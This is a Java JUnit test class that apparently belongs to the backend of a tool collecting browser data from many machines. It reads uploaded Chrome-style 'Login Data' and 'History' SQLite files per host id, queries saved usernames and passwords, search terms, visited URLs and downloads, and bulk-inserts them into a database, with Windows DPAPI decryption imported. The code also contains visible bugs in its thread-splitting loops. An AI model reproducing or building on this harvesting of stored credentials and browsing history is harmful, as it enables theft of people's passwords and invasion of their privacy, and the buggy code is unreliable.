import com.jimmy.infaction.common.*;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.ThreadPoolExecutor;

import com.jimmy.infaction.job.DeBagJob;
import com.jimmy.infaction.pojo.Browser;
import com.jimmy.infaction.pojo.Browser_download;
import com.jimmy.infaction.pojo.Browser_keyword;
import com.jimmy.infaction.pojo.Browser_url;
import com.jimmy.infaction.service.BrowserDownloadService;
import com.jimmy.infaction.service.BrowserKeywordService;
import com.jimmy.infaction.service.BrowserService;
import com.jimmy.infaction.service.BrowserUrlService;
import com.sun.jna.platform.win32.Crypt32Util;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.test.annotation.Commit;
import org.springframework.test.annotation.Rollback;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;

import org.springframework.test.context.web.WebAppConfiguration;
import org.springframework.transaction.annotation.Transactional;


@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations = "classpath:spring/spring-*.xml")
@WebAppConfiguration("src/main/resources")
@Transactional()
@Rollback(value = false)
//@Commit
public class TestA {
	@Autowired
	private BrowserService browserService ;

	@Autowired
	private BrowserKeywordService browserKeywordService ;
	@Autowired
	private BrowserDownloadService browserDownloadService ;
	@Autowired
	private BrowserUrlService  browserUrlService ;

	@Test
	public void tl() {
		List list = new ArrayList();
//		list2.add(11);
//		list2.addAll(list);
//		list2.addAll(list1);

		System.out.println(list.subList(1,2));
	}
	@Test
	public  void  t1()   throws Exception{
//		String jsonstr = "[{\"hostname\":\"RSVUBLJAANBQZT6\",\"uptime\":107492,\"bootTime\":1569191716,\"procs\":221,\"os\":\"windows\",\"platform\":\"Microsoft Windows 10 Pro\",\"platformFamily\":\"Standalone Workstation\",\"platformVersion\":\"10.0.18362 Build 18362\",\"kernelVersion\":\"\",\"kernelArch\":\"x86_64\",\"virtualizationSystem\":\"\",\"virtualizationRole\":\"\",\"hostid\":\"e5b51039-15d7-47a7-9470-adf9888dee3c\"}]";
//		JSONArray jsonArray = new JSONArray(jsonstr);
//		JSONObject jsonObj = jsonArray.getJSONObject(0);
//		System.out.println(jsonObj.getString("platform"));
		String rootPath = "F:\\workspace\\infaction\\upload\\";
		File dir = new File(rootPath);
		File[] files = dir.listFiles();
		for (File f : files) {
			if (!(f.getName().matches(".*.zip"))) {
				for (File ff : f.listFiles()) {
					int num = 10;
					try {
						switch (ff.getName()){
							case "Login Data":
								SqliteHelper h = new SqliteHelper(rootPath+f.getName()+"\\"+"Login Data");
								List<SqlLiteDemoResult> LoginList = h.executeQueryList("Select action_url, username_value, password_value FROM logins", SqlLiteDemoResult.class);
								int Llength = LoginList.size();
								int LbaseNum = Llength / num;
								int LremainderNum = Llength % num;
								int Lend = 0;
								for (int i = 0; i < num; i++) {
									int start = Lend;
									Lend = start + LbaseNum;
									if (i == (num - 1)) {
										Lend = Llength;
									} else if (i < LremainderNum) {
										Lend = Lend + 1;
									}
									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", LoginList, start, Lend, f.getName());
									thread.start();
								}
								break;
							case "History":
								SqliteHelper hi = new SqliteHelper(rootPath+f.getName()+"\\"+"History");
								List<HistoryKeyResult> HkList = hi.executeQueryList("Select  lower_term FROM keyword_search_terms", HistoryKeyResult.class);
								int length = HkList.size();
								int baseNum = length / num;
								int remainderNum = length % num;
								int end = 0;
								for (int i = 0; i < num; i++) {
									int start = end;
									end = start + baseNum;
									if (i == (num - 1)) {
										end = length;
									} else if (i < remainderNum) {
										end = end + 1;
									}
									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", HkList, start, end, f.getName());
									thread.start();
								}
								List<HistoryUrlResult> HList = hi.executeQueryList("Select url, title, visit_count FROM urls", HistoryUrlResult.class);
								int llength = HList.size();
								int lbaseNum = length / num;
								int lremainderNum = length % num;
								int lend = 0;
								for (int i = 0; i < num; i++) {
									int start = lend;
									lend = start + lbaseNum;
									if (i == (num - 1)) {
										lend = llength;
									} else if (i < lremainderNum) {
										lend = lend + 1;
									}
									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", HList, start, end, f.getName());
									thread.start();
								}
								List<HistoryDownloadResult> HdList = hi.executeQueryList("Select  current_path,tab_url FROM downloads", HistoryDownloadResult.class);
								int lllength = HdList.size();
								int llbaseNum = lllength / num;
								int llremainderNum = lllength % num;
								int llend = 0;
								for (int i = 0; i < num; i++) {
									int start = llend;
									llend = start + llbaseNum;
									if (i == (num - 1)) {
										llend = lllength;
									} else if (i < llremainderNum) {
										llend = llend + 1;
									}
									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", HdList, start, llend, f.getName());
									thread.start();
								}
								break;
							case "Cookies":
								break;
//								System.out.println(ff.getName());
							default:
								break;
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
//					ff.delete();
				}
			}
		}
	}
	class ExecMultiBag extends Thread{
		private String threadName;
		private List<HistoryKeyResult> hklist ;
		private List<HistoryUrlResult> hllist ;
		private List<HistoryDownloadResult> hdlist ;
		private List<SqlLiteDemoResult> Llist ;
		private int startIndex;
		private int endIndex;
		private String hostid ;
		public  ExecMultiBag(String threadName,List list,int startIndex, int endIndex, String hostid ){
			System.out.println(list);
			this.threadName = threadName;
			this.hostid = hostid;
			this.startIndex = startIndex;
			this.endIndex = endIndex;
			if (list.toString().matches("(.*)KeyResult(.*)")){
				this.hklist = list;
			}else if(list.toString().matches("(.*)UrlResult(.*)")) {
				this.hllist = list;
			}else if(list.toString().matches("(.*)DownloadResult(.*)")) {
				this.hdlist = list;
			}else if(list.toString().matches("(.*)SqlLiteDemoResult(.*)")) {
				this.Llist = list;
			}
		}

		@Override
		public void run() {
			if(null!=hklist){
				List<HistoryKeyResult> kList = hklist.subList(startIndex, endIndex);
				System.out.println(threadName+"处理了"+kList.size()+"条！startIndex:"+startIndex+"|endIndex:"+endIndex);
				for (HistoryKeyResult result : kList) {
					Browser_keyword browser_keyword = new Browser_keyword();
					browser_keyword.setKey(result.getKey());
					browser_keyword.setHostid(hostid);
					browserKeywordService.insert(browser_keyword);
				}
			}else if(null!=hllist){
				List<HistoryUrlResult> lList = hllist.subList(startIndex, endIndex);
				System.out.println(threadName+"处理了"+lList.size()+"条！startIndex:"+startIndex+"|endIndex:"+endIndex);
				for (HistoryUrlResult result : lList) {
					Browser_url browser_url = new Browser_url();
					browser_url.setWebsite(result.getWebsite());
					browser_url.setTitle(result.getTitle());
					browser_url.setVisit(result.getVisit());
					browser_url.setHostid(hostid);
					browserUrlService.insert(browser_url);
				}
			}else if(null!=hdlist){
				List<HistoryDownloadResult> dList = hdlist.subList(startIndex, endIndex);
				System.out.println(threadName+"处理了"+dList.size()+"条！startIndex:"+startIndex+"|endIndex:"+endIndex);
				for (HistoryDownloadResult result : dList) {
					Browser_download browser_download = new Browser_download();
					browser_download.setUrl(result.getTab_url());
					browser_download.setPath(result.getCurrent_path());
					browser_download.setHostid(hostid);
					browserDownloadService.insert(browser_download);
				}
			}
		}
	}

//	class ExecMultiBag implements  Runnable{
//		private List<HistoryKeyResult> hklist ;
//		private String name ;
//		public ExecMultiBag(List<HistoryKeyResult> hkList,  String name) {
//			this.hklist = hkList;
//			this.name = name;
//
//		}
//
//		@Override
//		public void run() {
//			if(null!=hklist){
//				for (HistoryKeyResult result : hklist) {
//					Browser_keyword browser_keyword = new Browser_keyword();
//					browser_keyword.setKey(result.getKey());
//					browser_keyword.setHostid(name);
//					browserKeywordService.insert(browser_keyword);
//				}
//			}
//		}
//	}
}
